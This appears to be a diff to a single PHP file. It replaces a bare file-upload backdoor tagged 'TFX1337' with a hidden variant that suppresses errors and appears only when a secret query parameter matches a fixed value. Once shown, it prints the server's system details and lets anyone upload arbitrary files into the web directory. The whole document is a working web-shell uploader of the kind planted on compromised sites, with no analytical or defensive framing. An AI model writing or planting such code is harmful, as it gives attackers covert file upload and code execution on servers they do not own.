@@ -1,1 +1,6 @@
-<?php echo "TFX1337"; echo "<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='Upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "Upload Success"; } else { echo "Upload Failed"; } } ?>
+<?php
+error_reporting(0); 
+if ($_GET['noncexwx'] == '18054376'){
+    echo 'TFX1337<br>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
+} 
+?>
